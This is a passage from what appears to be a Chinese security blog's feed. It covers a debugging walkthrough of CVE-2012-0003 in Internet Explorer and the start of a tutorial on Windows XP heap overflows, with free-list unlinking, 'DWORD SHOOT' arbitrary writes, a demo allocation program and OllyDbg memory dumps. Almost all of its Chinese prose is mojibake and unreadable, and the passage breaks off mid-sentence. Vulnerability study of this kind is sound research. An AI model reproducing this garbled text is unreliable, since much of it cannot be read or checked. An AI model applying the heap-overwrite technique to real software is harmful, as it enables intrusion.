    DWORD SHOOT,è€Œæ˜¯å·§å¦™åœ°æ„é€ htmlä»£ç è¾¾åˆ°æ§åˆ¶eipçš„ç›®çš„,å¦‚æœæ˜¯åˆ©ç”¨å †æº¢å‡º,ä¸€èˆ¬ä¼šæƒ³åˆ°åœ¨ä¸Šé¢è®¿é—®å¼‚å¸¸æ—¶é€šè¿‡æ‰¾åˆ°ä¸€ä¸ª
    DWORD SHOOTçš„æœºä¼šæ¥è¦†ç›–å¼‚å¸¸å¤„ç†ç›¸å…³çš„å‡½æ•°åœ°å€æ¥æ§åˆ¶eip,ä¸”è¦åœ¨å¯æ§æ•°æ®å¤åˆ¶åˆ°å†…å­˜åæ‰¾åˆ°å †åˆ†é…è°ƒç”¨

win+r:cmd
gflags -i iexplore.exe -hpa
bu WINMM!midiOutPlayNextPolyEvent
g
ieæ‰“å¼€http://192.168.3.165:8080/test.html
    Breakpoint 0 hit
    eax=00000000 ebx=ffffffff ecx=7ffdf000 edx=00216790 esi=00216780 edi=002167d8
    eip=76b2d038 esp=0012e5b0 ebp=0012e5dc iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    WINMM!midiOutPlayNextPolyEvent:
    76b2d038 8bff            mov     edi,edi
    æ­¤æ—¶ä¸­æ–­ä¸‹æ¥

    






&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 23 Aug 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/23/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0003/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/23/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0003/</guid>
        
        <category>æ¼æ´æˆ˜äº‰</category>
        
        <category>æ¼æ´åˆ†æ</category>
        
        <category>å †æº¢å‡º</category>
        
        
        <category>äºŒè¿›åˆ¶</category>
        
      </item>
    
      <item>
        <title>æ¼æ´æˆ˜äº‰-cve-2010-2553</title>
        <description>&lt;h3 id=&quot;x00-&quot;&gt;0x00 å †æº¢å‡ºåŸºç¡€çŸ¥è¯†&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;good link:
    http://blog.csdn.net/ithzhang/article/details/12711431
    http://www.mottoin.com/87277.html
    http://www.voidcn.com/blog/u010797814/article/p-3924286.html

2&amp;gt;å †è¡¨åªç´¢å¼•æ‰€æœ‰çš„ç©ºé—²æ€å †å—,å·²åˆ†é…|å ç”¨çš„å †å—ç”±ä½¿ç”¨å®ƒçš„ç¨‹åºç´¢å¼•,ç©ºé—²æ€å †å—å’Œå ç”¨æ€å †å—:

    å †å—ä½¿ç”¨_HEAP_ENTYRç»“æ„æ¥æè¿°,è¯¥ç»“æ„å 8Byte. _HEAP_ENTRYç»“æ„ä¹‹åå°±æ˜¯ä¾›åº”ç”¨ç¨‹åºä½¿ç”¨çš„åŒºåŸŸ.è°ƒç”¨HeapAllocå‡½æ•°
    å°†è¿”å›HEAP_ENTRYä¹‹åçš„åœ°å€.æ­¤åœ°å€å‡å»8Byteä¾¿å¯ä»¥å¾—åˆ°_HEAP_ENTRYç»“æ„.å¯¹äºå·²ç»é‡Šæ”¾çš„å †å—,å †ç®¡ç†å™¨å®šä¹‰äº†
    _HEAP_FREE_ENTRYç»“æ„æ¥æè¿°.è¯¥ç»“æ„çš„å‰å…«ä¸ªå­—èŠ‚ä¸_HEAP_ENTRYç»“æ„å®Œå…¨ç›¸åŒ.ä½†å¢åŠ äº†8ä¸ªå­—èŠ‚æ¥å­˜å‚¨ç©ºé—²é“¾è¡¨çš„å¤´èŠ‚ç‚¹.
    _HEAP_FREE_ENTRYæ˜¯ç©ºé—²æ€å †å—ä¸­çš„å—é¦–(8byte)ä¸flink,blink(4+4=8)çš„æ€»å’Œ,_HEAP_FREE_ENTRYå…±16byte,_HEAP_ENTRY
    æ˜¯å ç”¨æ€å †å—ä¸­å¯¹åº”çš„å—é¦–çš„ç»“æ„,å¤§å°ä¸º8byte.
    å¦‚ä¸‹å›¾:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-1.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3&amp;gt;å †æº¢å‡ºå®è´¨:
    ä¸€ä¸ªç©ºé—²å †å—(è®¾ä¸ºblockå †å—)çš„å¸ä¸‹å¿…å®šå¯¹åº”å¦‚ä¸‹æ“ä½œ:
    block.blink.flink=block.flink
    block.flink.blink=block.blink

    ä¹Ÿå³ç›¸å½“äºè¿™ä¸ªå †å—æœ‰å¦‚ä¸‹æ“ä½œ:
    [flink+4]=blink
    [blink]=flink

    å…¶ä¸­flinkä»£è¡¨ä¸‹ä¸€ä¸ªå †å—çš„ç´¢å¼•,blinkä»£è¡¨å‰ä¸€ä¸ªå †å—çš„ç´¢å¼•

    é€šå¸¸ä¸€ä¸ªå †å—çš„åˆ†é…(HeapAlloc)å¯¹åº”ä¸€ä¸ªç©ºé—²å †å—çš„å¸ä¸‹,ä¹Ÿå³å¯¹åº”ä¸€ä¸ªDWORD SHOOTæœºä¼š,å¯ä»¥åœ¨è¿™ä¸ªå †å—åˆ†é…å‰é€šè¿‡
    memcopy,strcpyç­‰æ“ä½œå°†è¿™ä¸ªåœ¨åˆ†é…å‰è¿˜å¤„äºç©ºé—²æ€çš„å †å—çš„flinkå’Œblinkè¦†ç›–æˆä»»æ„æ•°æ®,è¿™ä¸ªç©ºé—²æ€å †å—ä¸€æ—¦å‘ç”Ÿåˆ†é…
    ,å°†å¯¹åº”DWORD SHOOT

    0day2ä¸­p169é¡µä¸­çš„&quot;äº‹å®ä¸Š,å †å—çš„åˆ†é…,é‡Šæ”¾,åˆå¹¶æ“ä½œéƒ½èƒ½å¼•å‘DWORD SHOOT,ç”šè‡³å¿«è¡¨ä¹Ÿå¯ä»¥è¢«ç”¨
    æ¥åˆ¶é€ DWORD SHOOT&quot;çš„è¯´æ³•æœ‰å¾…è€ƒé‡,åˆ°ç›®å‰,ç¬”è€…åªè®¤åŒä¸€ä¸ªç©ºé—²å †å—çš„å¸ä¸‹,ä¹Ÿå³å¯¹åº”0day2è¿™å¥è¯ä¸­çš„&quot;å †å—çš„åˆ†é…&quot;èƒ½
    å¼•å‘DWORD SHOOT

4&amp;gt;è°ƒè¯•å †ä¸è°ƒè¯•æ ˆä¸åŒ,ä¸èƒ½ç›´æ¥ç”¨è°ƒè¯•å™¨æ¥åŠ è½½ç¨‹åº,å¦åˆ™å †ç®¡ç†å‡½æ•°ä¼šæ£€æµ‹åˆ°å½“å‰è¿›ç¨‹å¤„äºè°ƒè¯•çŠ¶æ€,è€Œä½¿ç”¨è°ƒè¯•æ€å †ç®¡ç†
  ç­–ç•¥
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-&quot;&gt;0x01 å †æº¢å‡ºåŸç†&lt;/h3&gt;

&lt;h4 id=&quot;day2&quot;&gt;1&amp;gt;0day2å®ä¾‹&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ç³»ç»Ÿ:winxp sp3+vc6.0

-----------------0dayheap.c-(page:152)--------
#include &amp;lt;windows.h&amp;gt;
int main()
{
    HLOCAL h1,h2,h3,h4,h5,h6;
    HANDLE hp;
    getchar();//å°†ä¹¦ä¸­ä¸‹é¢çš„__asm int 3æ”¹æˆè¿™é‡Œçš„getchar(),å› ä¸ºå®é™…ä¸­å°†odè®¾ä¸ºå®æ—¶è°ƒè¯•æç¤ºæœ‰é—®é¢˜
    hp=HeapCreate(0,0x1000,0x10000);//åˆ›å»ºä¸€ä¸ª0x1000=4096å¤§å°çš„å †
    //__asm int 3,ä¹¦ä¸­æ˜¯__asm int 3,åœ¨winxp sp3ä¸Šæµ‹è¯•ä¸­æ–­æ•ˆæœè¿˜å¥½,æ”¹æˆä¸Šé¢çš„getchar()

    h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,3);
    h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,5);
    h3=HeapAlloc(hp,HEAP_ZERO_MEMORY,6);
    h4=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
    h5=HeapAlloc(hp,HEAP_ZERO_MEMORY,19);
    h6=HeapAlloc(hp,HEAP_ZERO_MEMORY,24);

    //free block and prevent coaleses
    HeapFree(hp,0,h1);//free to freelist[2]
    HeapFree(hp,0,h3);//free to freelist[2]
    HeapFree(hp,0,h5);//free to freelist[4]

    HeapFree(hp,0,h4);//coalese h3,h4,h5,link the large block to freelist[8]

    return 0;
}
--------------------end-----------------------

ç¼–è¯‘æˆreleaseç‰ˆæœ¬exe
åŒå‡»è¿è¡Œ0dayheap.exe
odé™„åŠ 
f9
alt+eé€‰æ‹©0dayheap.exe
åœ¨00401018çš„call HeapCreateå¤„ä¸‹æ–­

    00401018    FF15 08604000   call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapCreate&amp;gt;; kernel32.HeapCreate
    0040101E    8B3D 04604000   mov edi,dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapAll&amp;gt;; ntdll.RtlAllocateHeap
    
åœ¨0dayheap.exeçš„çª—å£ä¸­è¾“å…¥&quot;a&quot;,enter
å‘ç°odæ²¡æœ‰æˆåŠŸä¸­æ–­,å¯èƒ½æ˜¯odçš„åŸå› 
alt+v
t
resume all threads
ä¸­æ–­åœ¨401018å¤„
f8
    æ­¤æ—¶eax=3a0000,ä¹Ÿå³heapcreateåˆ›å»ºçš„å †çš„èµ·å§‹åœ°å€ä¸º3a0000
åœ¨å¯„å­˜å™¨çª—å£ä¸­å³é”®eax,åœ¨æ•°æ®çª—å£ä¸­è·Ÿéš

    003A0000  C8 00 00 00 7A 01 00 00 FF EE FF EE 00 10 00 00  ?..z..ï£µ??..
    003A0010  00 00 00 00 00 FE 00 00 00 00 10 00 00 20 00 00  .....?..... ..
    003A0020  00 02 00 00 00 20 00 00 30 01 00 00 FF EF FD 7F  .... ..0..ï£µç¨
    003A0030  05 00 08 06 00 00 00 00 00 00 00 00 00 00 00 00  .............
    003A0040  00 00 00 00 98 05 3A 00 0F 00 00 00 F8 FF FF FF  ....?:....?ï£µï£µ
    003A0050  50 00 3A 00 50 00 3A 00 40 06 3A 00 00 00 00 00  P.:.P.:.@:.....
    003A0060  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    003A0070  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

alt+mä¹Ÿå¯ä»¥æŸ¥çœ‹å †çš„èµ·å§‹åœ°å€,å¦‚ä¸‹å›¾
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-2.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;åœ¨003a000é‚£ä¸€è¡Œä¸Šå³é”®å¤åˆ¶ä¸€è¡Œ,ç²˜è´´å¦‚ä¸‹:
    Memory map, æ¡ç›® 15
     åœ°å€=003A0000
     å¤§å°=00001000 (4096.)
     å±ä¸»=         003A0000 (è‡ªèº«)
     åŒºæ®µ=
     ç±»å‹=Priv 00021004
     è®¿é—®=RW
     åˆå§‹è®¿é—®=RW

åœ¨æ•°æ®çª—å£ä¸­çš„003a0000çš„0x178åç§»ä¹Ÿå³3a0178,æ˜¯ç©ºè¡¨ç´¢å¼•,ä¹Ÿå³3a0178æŒ‡å‘freelist,3a0178å¤„çš„å€¼ä¸ºfreelistçš„ç¬¬ä¸€é¡¹å†…å®¹,å¦‚ä¸‹:
    
    003A0170  00 00 00 00 00 00 00 00      88 06 3A 00 88 06 3A 00  ........?:.?:.

    free[0]=0x003a0178
    free[0].flink=[3a0178]=003a0688
    free[0].blink=[3a0178+4]=003a0688

003a0688å¤„çš„æ•°æ®çª—å£å€¼å¦‚ä¸‹:

    003A0688  78 01 3A 00 78 01 3A 00 00 00 00 00 00 00 00 00  x:.x:.........
    003A0698  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

    free[-1]=0x003a0688
    free[-1].flink=[3a0688]=003a0178    ====free[0]
    free[-1].blink=[3a0688+4]=003a0178
    
    å¯ä»¥çœ‹å‡ºHeapCreateäº§ç”Ÿçš„å †ä¸­çš„ç©ºè¡¨åªæœ‰ä¸¤é¡¹,ä¹Ÿå³åªæœ‰ä¸€ä¸ªå †å—,ä¸”å †å—ç´¢å¼•ä¸ºfree[-1]+8=0x003a0690
    h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,3);//å®é™…åˆ†é…16å­—èŠ‚(2ä¸ªå †å—å¤§å°),é¢„æµ‹h1=0x3a0690
    h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,5);//å®é™…åˆ†é…16å­—èŠ‚(2ä¸ªå †å—å¤§å°),é¢„æµ‹h2=0x3a0690+16=0x3a06a0
    h3=HeapAlloc(hp,HEAP_ZERO_MEMORY,6);//å®é™…åˆ†é…16å­—èŠ‚(2ä¸ªå †å—å¤§å°),é¢„æµ‹h3=0x3a0690+16*2=0x3a06b0
    h4=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);//å®é™…åˆ†é…16å­—èŠ‚(2ä¸ªå †å—å¤§å°),é¢„æµ‹h4=0x3a0690+16*3=0x3a06c0
    h5=HeapAlloc(hp,HEAP_ZERO_MEMORY,19);//å®é™…åˆ†é…32å­—èŠ‚(4ä¸ªå †å—å¤§å°),é¢„æµ‹h5=0x3a0690+16*4=0x3a06d0
    h6=HeapAlloc(hp,HEAP_ZERO_MEMORY,24);//å®é™…åˆ†é…32å­—èŠ‚(4ä¸ªå †å—å¤§å°),é¢„æµ‹h6=0x3a0690+16*4+32=0x3a06f0
    h1-h6å…±åˆ†é…128ä¸ªå­—èŠ‚,128/8=16ä¸ªå †å•å…ƒ

åœ¨å…­å¤„HeapAllocä¸Šä¸‹æ–­

    00401018    FF15 08604000   call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapCreate&amp;gt;]          ; kernel32.HeapCreate
    0040101E    8B3D 04604000   mov edi,dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapAlloc&amp;gt;]        ; ntdll.RtlAllocateHeap
    00401024    8BF0            mov esi,eax
    00401026    6A 03           push 0x3
    00401028    6A 08           push 0x8
    0040102A    56              push esi
    0040102B    FFD7            call edi     --------&amp;gt;f2
    0040102D    6A 05           push 0x5
    0040102F    6A 08           push 0x8
    00401031    56              push esi
    00401032    8BD8            mov ebx,eax
    00401034    FFD7            call edi     --------&amp;gt;f2
    00401036    6A 06           push 0x6
    00401038    6A 08           push 0x8
    0040103A    56              push esi
    0040103B    FFD7            call edi     --------&amp;gt;f2
    0040103D    6A 08           push 0x8
    0040103F    6A 08           push 0x8
    00401041    56              push esi
    00401042    8BE8            mov ebp,eax
    00401044    FFD7            call edi     --------&amp;gt;f2
    00401046    6A 13           push 0x13
    00401048    6A 08           push 0x8
    0040104A    56              push esi
    0040104B    894424 20       mov dword ptr ss:[esp+0x20],eax
    0040104F    FFD7            call edi     --------&amp;gt;f2
    00401051    6A 18           push 0x18
    00401053    6A 08           push 0x8
    00401055    56              push esi
    00401056    894424 1C       mov dword ptr ss:[esp+0x1C],eax
    0040105A    FFD7            call edi     --------&amp;gt;f2

f8
f8
..
(eip=0x40102d)
    åˆ°40102då¤„eax=0x3a0688,ä¹Ÿå³h1=0x3a0688,è¯´æ˜é¢„æµ‹é”™äº†,å› ä¸ºåˆ†é…ä¸Šé¢å”¯ä¸€çš„å †å—(free[-1]=003a0688)åˆ†é…ä»¥åå°±ä¸
    å†æ˜¯ç©ºé—²å †å—äº†,å˜æˆå ç”¨æ€çš„å †å—,å ç”¨æ€çš„å †å—æ˜¯æ²¡æœ‰flinkå’Œblikçš„,ä¹Ÿå³å ç”¨æ€çš„å †å—çš„ç´¢å¼•ä¸å±äºç©ºè¡¨ä¸­,å±äº
    åº”ç”¨ç¨‹åº.ä¸Šé¢å”¯ä¸€çš„å †å—åˆ†å‰²ä»¥åçš„å †å—æ˜¯åœ¨0x3a0688å¤„å‰²ä¸‹16ä¸ªå­—èŠ‚(h1çš„å¤§å°)åå‰©ä¸‹çš„å”¯ä¸€çš„å †å—
    ç°åœ¨0x3a688å¤„çš„æ•°æ®å¦‚ä¸‹:
        
    003A0688  00 00 00 00 78 01 3A 00 2E 01 02 00 00 10 00 00  ....x:......
    003A0698  78 01 3A 00 78 01 3A 00 00 00 00 00 00 00 00 00  x:.x:.........

    é‡æ–°é¢„æµ‹:
    h1=003a0688
        h1å †å—çš„å—é¦–åœ¨h1-8=3a0680å¤„:
        003A0680:
        02 00 08 00 AA 01 0D 00          ..?..
        å—é¦–çš„å‰2ä¸ªå­—èŠ‚å¯¹åº”å½“å‰å †å—çš„å¤§å°(å †å—çš„ä¸ªæ•°,æ¯ä¸ªå †å—å•ä½ä¸º8å­—èŠ‚å¤§å°),ç¬¬3-4ä¸ªå­—èŠ‚å¯¹åº”å‰ä¸€ä¸ªå †å—å¤§å°,è¿™
        é‡Œå‰2ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å½“å‰å †å—å¤§å°ä¸º2ä¸ªå †å—,ç¬¬3-4å­—èŠ‚ä¸º0008,å³å‰ä¸€ä¸ªå †å—å¤§å°ä¸º8ä¸ªå †å—
    h2=003a0698
    h3=003a06a8
    h4=003a06b8
    h5=003a06c8
    h6=003a06e8

f8
f8
...
(eip=00401036)
    åˆ°00401036å¤„eax=3a0698,ä¹Ÿå³h2=0x3a0698ä¸é¢„æµ‹ç»“æœä¸€è‡´,h2å †å—çš„å—é¦–åœ¨h2-8=3a0690å¤„:
    003a0690:
    02 00 02 00 A8 01 0B 00          ..?.
    å‰2ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å½“å‰å †å—å¤§å°ä¸º2,3-4ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    æ­¤æ—¶(h1,h2åˆ†é…å®Œæˆ,h3è¿˜æœªåˆ†é…)å¯¹åº”çš„ç©ºé—²å †å—ç´¢å¼•(free[-1])ä¸ºh2+8+8=003a06a0+8=003a06a8,å…¶ä¸­003a06a0ä¸ºç©ºé—²
    å †å—å—é¦–çš„åœ°å€,ç©ºé—²å †å—çš„ç´¢å¼•ä¸ºå—é¦–+8å¤„,å…·ä½“å¦‚ä¸‹:

    003A0698  00 00 00 00 00 01 3A 00 2C 01 02 00 00 10 00 00  .....:.,....
    003A06A8  78 01 3A 00 78 01 3A 00 00 00 00 00 00 00 00 00  x:.x:.........
    003A06B8  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    ä¹Ÿå³ç©ºé—²å †å—çš„å—é¦–ä¸º2c 01 02 00 00 10 00 00==&amp;gt;å½“å‰ç©ºé—²å †å—å¤§å°ä¸º012c,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    æ­¤æ—¶çš„free[-1]=3a06a8,free[-1].flink=[3a06a8]=free[-1].blink=[3a06b0]=003a0178,ä¾ç„¶ä¸ºfree[0]

f8
f8
...
(eip=0040103D)
    åˆ°0040103Då¤„eax=3a06a8,ä¹Ÿå³h3=0x3a06a8ä¸é¢„æµ‹ç»“æœä¸€è‡´,h3å †å—çš„å—é¦–åœ¨h3-8=3a06a0å¤„:
    003A06A0  02 00 02 00 AE 01 0A 00 00 00 00 00 00 00 3A 00  ..?........:.
    å‰2ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å½“å‰å †å—çš„å¤§å°ä¸º2,3-4ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    æ­¤æ—¶(h1,h2,h3åˆ†é…å®Œæˆ,h4è¿˜æ²¡åˆ†é…)å¯¹åº”çš„ç©ºé—²å †å—ç´¢å¼•(free[-1])ä¸ºh3+8+8=3a06b0+8=3a06b8,å…¶ä¸­003a06b0ä¸ºç©ºé—²å †
    å—å—é¦–çš„åœ°å€,ç©ºé—²å †å—çš„ç´¢å¼•ä¸ºå—é¦–+8å¤„,å…·ä½“å¦‚ä¸‹:
    003A06B0  2A 01 02 00 00 10 00 00 78 01 3A 00 78 01 3A 00  *....x:.x:.
    å½“å‰ç©ºé—²å †å—å¤§å°ä¸º012c-2=012a,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    åŒæ ·æ˜¯free[-1].flink=free[-1].blink=003a0178=free[0]

f8
f8
...
(eip=00401046)
    åˆ°00401046å¤„eax=3a06b8,ä¹Ÿå³h4=0x3a06b8ä¸é¢„æµ‹ç»“æœä¸€è‡´,h4å †å—çš„å—é¦–åœ¨h4-8=30a6b0å¤„:
    003A06B0  02 00 02 00 AC 01 08 00 00 00 00 00 00 00 00 00  ..?.........
    å½“å‰å †å—å¤§å°ä¸º2,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    h4åˆ†é…å®Œ,h5è¿˜æ²¡åˆ†é…,ç©ºé—²å †å—ç´¢å¼•(free[-1])ä¸ºh4+8+8=30a6c0+8=30a6c8
    æ•°æ®å¦‚ä¸‹:
    003A06C0  28 01 02 00 00 10 00 00 78 01 3A 00 78 01 3A 00  (....x:.x:.
    å½“å‰ç©ºé—²å †å—çš„å¤§å°ä¸º012a-2=0128,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    åŒæ ·æ˜¯free[-1].flink=free[-1].blink=003a0178=free[0]

f8
f8
...
(eip=00401051)
    åˆ°00401051å¤„eax=3a06c8,ä¹Ÿå³h5=0x3a06c8ä¸é¢„æµ‹ç»“æœä¸€è‡´,h5å †å—çš„å—é¦–åœ¨h5-8=3a06c0å¤„:
    003A06C0  04 00 02 00 A2 01 0D 00 00 00 00 00 00 00 00 00  ..?..........
    å½“å‰å †å—çš„å¤§å°ä¸º4,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2

f8
f8
...
(eip=0040105c)
    åˆ°0040105cå¤„eax=3a06e8,ä¹Ÿå³h6=0x3a06e8ä¸é¢„æµ‹ç»“æœä¸€è‡´,h6å †å—çš„å—é¦–åœ¨h6-8=3a06e0å¤„:
    003A06E0  04 00 04 00 A6 01 08 00 00 00 00 00 00 00 00 00  ..?.........
    å½“å‰å †å—å¤§å°ä¸º4,å‰ä¸€å †å—å¤§å°ä¸º4
    h6åˆ†é…å®Œ,ç©ºé—²å †å—ç´¢å¼•(free[-1])ä¸ºh6+8*3+8=3a0700+8=3a0708
    æ•°æ®å¦‚ä¸‹:
    003A0700  20 01 04 00 00 10 00 00 78 01 3A 00 78 01 3A 00   ....x:.x:.
    å½“å‰ç©ºé—²å †å—çš„å¤§å°ä¸º0128-4-4=0120,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º4
    åŒæ ·æ˜¯free[-1].flink=free[-1].blink=003a0178=free[0]


åœ¨ä¸‹é¢çš„3ä¸ªå †å—é‡Šæ”¾(call heapfree,é‡Šæ”¾h1,h3,h5,h4)çš„å‡½æ•°ä¸‹æ–­

    0040105C    8B3D 00604000   mov edi,dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapFree&amp;gt;]         ; ntdll.RtlFreeHeap
    00401062    53              push ebx
    00401063    6A 00           push 0x0
    00401065    56              push esi
f2  00401066    FFD7            call edi                                            ; ntdll.RtlAllocateHeap
    00401068    55              push ebp
    00401069    6A 00           push 0x0
    0040106B    56              push esi
f2  0040106C    FFD7            call edi                                            ; ntdll.RtlAllocateHeap
    0040106E    8B4424 10       mov eax,dword ptr ss:[esp+0x10]
    00401072    50              push eax
    00401073    6A 00           push 0x0
    00401075    56              push esi
f2  00401076    FFD7            call edi                                            ; ntdll.RtlAllocateHeap
    00401078    8B4C24 14       mov ecx,dword ptr ss:[esp+0x14]
    0040107C    51              push ecx                                            ; ntdll.7C9301BB
    0040107D    6A 00           push 0x0
    0040107F    56              push esi
    00401080    FFD7            call edi                                            ; ntdll.RtlAllocateHeap
    00401082    5F              pop edi                                             ; 00320036
    00401083    5E              pop esi                                             ; 00320036
    00401084    5D              pop ebp                                             ; 00320036
    00401085    33C0            xor eax,eax
    00401087    5B              pop ebx                                             ; 00320036
    00401088    83C4 08         add esp,0x8
    0040108B    C3              retn

f8
f8
...
(eip=401068)
    åˆ°401068å¤„,h1å †å—è¢«é‡Šæ”¾,ç”±äºh1å®é™…åˆ†é…å¤§å°ä¸º2ä¸ªå †å•å…ƒå¤§å°(2*8=16å­—èŠ‚),é‡Šæ”¾åå°†é“¾å…¥free[2]è¿™ä¸ªç©ºé—²é“¾è¡¨ä¸­
    ,åœ¨h1é‡Šæ”¾ä¹‹å‰åªæœ‰free[0]è¿™ä¸€ä¸ªç©ºé—²é“¾è¡¨,h1é‡Šæ”¾åä¼šå¢åŠ ä¸€ä¸ªç©ºé—²é“¾è¡¨free[2],æ­¤æ—¶free[2]è¿™ä¸ªç©ºè¡¨åªæœ‰ä¸€ä¸ªç»“ç‚¹,æ­¤
    æ—¶free[0]é™„è¿‘æ•°æ®:

    eip=40105cæ—¶,ä¹Ÿå³ä¸Šé¢é‡Šæ”¾h1ä¹‹å‰,free[0]=3a0178,é™„è¿‘çš„æ•°æ®å¦‚ä¸‹:

    003A0170  00 00 00 00 00 00 00 00 08 07 3A 00 08 07 3A 00  ........:.:.
    003A0180  80 01 3A 00 80 01 3A 00 88 01 3A 00 88 01 3A 00  â‚¬:.â‚¬:.?:.?:.
    003A0190  90 01 3A 00 90 01 3A 00 98 01 3A 00 98 01 3A 00  ?:.?:.?:.?:.
    003A01A0  A0 01 3A 00 A0 01 3A 00 A8 01 3A 00 A8 01 3A 00  ?:.?:.?:.?:.
    003A01B0  B0 01 3A 00 B0 01 3A 00 B8 01 3A 00 B8 01 3A 00  ?:.?:.?:.?:.
    003A01C0  C0 01 3A 00 C0 01 3A 00 C8 01 3A 00 C8 01 3A 00  ?:.?:.?:.?:.
    003A01D0  D0 01 3A 00 D0 01 3A 00 D8 01 3A 00 D8 01 3A 00  ?:.?:.?:.?:.
    003A01E0  E0 01 3A 00 E0 01 3A 00 E8 01 3A 00 E8 01 3A 00  ?:.?:.?:.?:.
    003A01F0  F0 01 3A 00 F0 01 3A 00 F8 01 3A 00 F8 01 3A 00  ?:.?:.?:.?:.
    
    ç°åœ¨,eip=401068æ—¶,åˆšé‡Šæ”¾å®Œh1,free[0]=3a0178,é™„è¿‘æ•°æ®å¦‚ä¸‹:

    003A0170  00 00 00 00 00 00 00 00 08 07 3A 00 08 07 3A 00  ........:.:.
    003A0180  80 01 3A 00 80 01 3A 00(88 06 3A 00 88 06 3A 00) â‚¬:.â‚¬:.?:.?:.
    003A0190  90 01 3A 00 90 01 3A 00 98 01 3A 00 98 01 3A 00  ?:.?:.?:.?:.
    003A01A0  A0 01 3A 00 A0 01 3A 00 A8 01 3A 00 A8 01 3A 00  ?:.?:.?:.?:.
    003A01B0  B0 01 3A 00 B0 01 3A 00 B8 01 3A 00 B8 01 3A 00  ?:.?:.?:.?:.
    003A01C0  C0 01 3A 00 C0 01 3A 00 C8 01 3A 00 C8 01 3A 00  ?:.?:.?:.?:.
    003A01D0  D0 01 3A 00 D0 01 3A 00 D8 01 3A 00 D8 01 3A 00  ?:.?:.?:.?:.
    003A01E0  E0 01 3A 00 E0 01 3A 00 E8 01 3A 00 E8 01 3A 00  ?:.?:.?:.?:.
    003A01F0  F0 01 3A 00 F0 01 3A 00 F8 01 3A 00 F8 01 3A 00  ?:.?:.?:.?:.
    
    ä¸åŒä¹‹å¤„æ˜¯3a0188å’Œ3a018cå¤„çš„003a0188å˜æˆäº†003a0688,è€Œ003a0688æ­£æ˜¯h1çš„å€¼,è€Œh1é‡Šæ”¾åå°†é“¾å…¥free[2]çš„ç©ºè¡¨,è¯´æ˜
    3a0188æ­£æ˜¯free[2]è¿™ä¸ªä½ç½®,é‚£ä¹ˆ3a0180å°±æ˜¯free[1]çš„ä½ç½®,ä¹Ÿå³ä»+0x178å¼€å§‹,æœ‰128ä¸ªå…ƒç´ ,æ¯ä¸ª8å­—èŠ‚å¤§å°,è¿™
    128ä¸ªå…ƒç´ æ„æˆä¸€ä¸ªæŒ‡é’ˆæ•°ç»„,è¿™ä¸ªæ•°ç»„å«åš&quot;ç©ºè¡¨ç´¢å¼•&quot;,è¿™ä¸ªæ•°ç»„çš„æ¯ä¸€é¡¹åŒ…æ‹¬ä¸¤ä¸ªæŒ‡é’ˆ,æŒ‡é’ˆä»£è¡¨å¯¹åº”ç©ºè¡¨çš„ç¬¬ä¸€ä¸ªç©º
    é—²å †å—çš„å†…å­˜åœ°å€.

f8
f8
...
(eip=40106e)
    åˆ°è¿™é‡Œh3é‡Šæ”¾å®Œ,ç”±äºh3ä¹Ÿæ˜¯ä¸¤ä¸ªå †å—å•å…ƒå¤§å°,æ‰€ä»¥h3ä¹Ÿå°†é“¾å…¥åˆ°free[2]çš„ç©ºè¡¨å½“ä¸­
    å¯ä»¥é¢„æµ‹:
